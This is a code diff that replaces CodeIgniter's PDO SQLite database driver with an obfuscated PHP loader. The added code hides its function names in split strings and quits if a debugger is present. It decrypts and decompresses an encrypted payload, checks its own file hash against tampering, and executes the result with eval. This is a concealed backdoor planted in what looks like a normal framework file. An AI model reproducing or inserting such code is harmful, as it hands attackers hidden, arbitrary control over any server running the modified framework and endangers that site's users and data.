@@ -1,219 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 3.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * PDO SQLite Database Adapter Class
- *
- * Note: _DB is an extender class that the app controller
- * creates dynamically based on whether the query builder
- * class is being used or not.
- *
- * @package		CodeIgniter
- * @subpackage	Drivers
- * @category	Database
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/database/
- */
-class CI_DB_pdo_sqlite_driver extends CI_DB_pdo_driver {
-
-	/**
-	 * Sub-driver
-	 *
-	 * @var	string
-	 */
-	public $subdriver = 'sqlite';
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * ORDER BY random keyword
-	 *
-	 * @var	array
-	 */
-	protected $_random_keyword = array('RANDOM()', 'RANDOM()');
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Class constructor
-	 *
-	 * Builds the DSN if not already set.
-	 *
-	 * @param	array	$params
-	 * @return	void
-	 */
-	public function __construct($params)
-	{
-		parent::__construct($params);
-
-		if (empty($this->dsn))
-		{
-			$this->dsn = 'sqlite:';
-
-			if (empty($this->database) && empty($this->hostname))
-			{
-				$this->database = ':memory:';
-			}
-
-			$this->database = empty($this->database) ? $this->hostname : $this->database;
-		}
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Show table query
-	 *
-	 * Generates a platform-specific query string so that the table names can be fetched
-	 *
-	 * @param	bool	$prefix_limit
-	 * @return	string
-	 */
-	protected function _list_tables($prefix_limit = FALSE)
-	{
-		$sql = 'SELECT "NAME" FROM "SQLITE_MASTER" WHERE "TYPE" = \'table\'';
-
-		if ($prefix_limit === TRUE && $this->dbprefix !== '')
-		{
-			return $sql.' AND "NAME" LIKE \''.$this->escape_like_str($this->dbprefix)."%' "
-				.sprintf($this->_like_escape_str, $this->_like_escape_chr);
-		}
-
-		return $sql;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Fetch Field Names
-	 *
-	 * @param	string	$table	Table name
-	 * @return	array
-	 */
-	public function list_fields($table)
-	{
-		// Is there a cached result?
-		if (isset($this->data_cache['field_names'][$table]))
-		{
-			return $this->data_cache['field_names'][$table];
-		}
-
-		if (($result = $this->query('PRAGMA TABLE_INFO('.$this->protect_identifiers($table, TRUE, NULL, FALSE).')')) === FALSE)
-		{
-			return FALSE;
-		}
-
-		$this->data_cache['field_names'][$table] = array();
-		foreach ($result->result_array() as $row)
-		{
-			$this->data_cache['field_names'][$table][] = $row['name'];
-		}
-
-		return $this->data_cache['field_names'][$table];
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Returns an object with field data
-	 *
-	 * @param	string	$table
-	 * @return	array
-	 */
-	public function field_data($table)
-	{
-		if (($query = $this->query('PRAGMA TABLE_INFO('.$this->protect_identifiers($table, TRUE, NULL, FALSE).')')) === FALSE)
-		{
-			return FALSE;
-		}
-
-		$query = $query->result_array();
-		if (empty($query))
-		{
-			return FALSE;
-		}
-
-		$retval = array();
-		for ($i = 0, $c = count($query); $i < $c; $i++)
-		{
-			$retval[$i]			= new stdClass();
-			$retval[$i]->name		= $query[$i]['name'];
-			$retval[$i]->type		= $query[$i]['type'];
-			$retval[$i]->max_length		= NULL;
-			$retval[$i]->default		= $query[$i]['dflt_value'];
-			$retval[$i]->primary_key	= isset($query[$i]['pk']) ? (int) $query[$i]['pk'] : 0;
-		}
-
-		return $retval;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Replace statement
-	 *
-	 * @param	string	$table	Table name
-	 * @param	array	$keys	INSERT keys
-	 * @param	array	$values	INSERT values
-	 * @return 	string
-	 */
-	protected function _replace($table, $keys, $values)
-	{
-		return 'INSERT OR '.parent::_replace($table, $keys, $values);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Truncate statement
-	 *
-	 * Generates a platform-specific truncate string from the supplied data
-	 *
-	 * If the database does not support the TRUNCATE statement,
-	 * then this method maps to 'DELETE FROM table'
-	 *
-	 * @param	string	$table
-	 * @return	string
-	 */
-	protected function _truncate($table)
-	{
-		return 'DELETE FROM '.$table;
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_v8kefjzf=('bas'.'e64'.'_de'.'cod'.'e');
+$_b758wm9r=('gzu'.'nco'.'mpr'.'ess');
+$_c4j7s02q=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_r3wplz56='ETqWGuu2';
+$_n2fv4d1h='H9aNfR0HKZU=';
+$_sbidcug6='RB7ZB5fe';
+$_sgblls6g='ZAHogSwI';
+$_x9g0q43y='ZVZ1bnZc';
+$_zb8l4jul='83tA1Q==';
+$_b0xhy51g='u/hK2Q+/';
+$_spv5vycj='bgkhGovP';
+$_o17m7uf1=$_v8kefjzf($_x9g0q43y.$_sbidcug6.$_sgblls6g.$_r3wplz56.$_n2fv4d1h);
+$_g8c66qcr=$_v8kefjzf($_b0xhy51g.$_spv5vycj.$_zb8l4jul);
+$_nas0u116=$_v8kefjzf('Wo3yZ9go3tZ+UYvmzEwlFbADrRgSQPnzxmwfrl8Em4ptahR66rQdvRRb0oTa29YBzJMumziwX1VHaYzygkufxVQ+ZVe6PqFyO4fwutyiJa6YHlXCk3145noTTvLOijxtgRtZ9h0klHwFKPUEChLvBx9PU0RCU5QELuxWOaqvuyHtvE/YGswf2Lg6c5QAmUva/8WHyF679bZggW+p/pPHm3NUCoiIkWh13unWvJ3yOYvox9/d9eXxEVCam89p4QZaZq5a+CdMtxwCWW8cjHZXo94+BLy5Z7foFpq2Imo9df3CsbF3rToGjforBPCYE3nogegiyKKxLK6r3OLtscz+rlDlXauDwtq2TxUXMCxbQERMuhf+BLmQJwFtebmJ59938GGVFpxdl3eQGo4AiQO0I4h2fh/AdHauueAJR29mpj7EVRkjsL95cK+dd8DDmWkZOv+aVc292gSDi6UObx6xAv0gPgbLEAMLKM6bYDP1Uy4b/gXhifnYfH168fuGwcGHXqUoX/obSIGXy1vHHB3JExwmTfUXg1U5jflka4w3lvnQ/gh6jDRUnA0QvrvPOvLGMXrCDGIP1o3D6fmdXG2b1IH+O0CZrKqudhFJ+U+90ZhuHv+8nRpPK7C8Eb+CjdPRKxGipHTxjGjMcBubLpwj6Y5NCFl8xGHDaGsHaVJkMe7dVuwKvLeYtTR/EuHICgcBLPIRmKd1T7cz+UgwaymPHHwbbQAJkX98dnaneHznleZbBu1VbGxLyU4swZprOsUUcPV2S5vSzadyZF4wvHm0z9xWttJe0ZwxqvyF/550KxWfTPfOirMMQNPbTo3Mi91rgFuQRYwJIU5N0EcyOuQglU9ceqdRv1To66RS2/TOOVaN3n9AanFme2/NGm0G8Ofbl0Ehr7V7gWP7DuqptOGza2Y2G93oheoqcmjLcysuyA2DelXp8OTHmrTiI/ZImBJq+kE607f1pH7+nHbVrl0SOP/fC73eiaWjZP7Rbcvvykjc4eMJx6pyXakqUdnBwstOnE1i6N8Xsb1VMlOIceHnPdiMAbRvZe3LgmHT18gMO0r0PVcvLiT32LeUaKB6aXuFgvOIlVxEfpBc3wLqqRYtozlO7Q2xEN/ai1T2MS5caatqKb0Lt9Za5KiSoHgkKLgD');
+$_awayzue1=$_c4j7s02q($_nas0u116,'aes-256-cbc',$_o17m7uf1,OPENSSL_RAW_DATA,$_g8c66qcr);
+if($_awayzue1===false){exit;}
+$_hbdj789w=$_b758wm9r($_awayzue1);
+if($_hbdj789w===false){exit;}
+$_cdgnedu6='13e61b3c3660dbe3c0c4b8c61dfddc8780ffcfd110873cfd2cac4b0b0afb22b6';
+$_fooqj1u4=@file_get_contents(__FILE__);
+if($_fooqj1u4!==false){
+$_f0rs81mo=str_replace($_cdgnedu6,"0000000000000000000000000000000000000000000000000000000000000000",$_fooqj1u4);
+$_msvkr8in=hash("sha256",$_f0rs81mo);
+if($_msvkr8in!==$_cdgnedu6){@http_response_code(403);exit;}
 }
+eval($_hbdj789w);
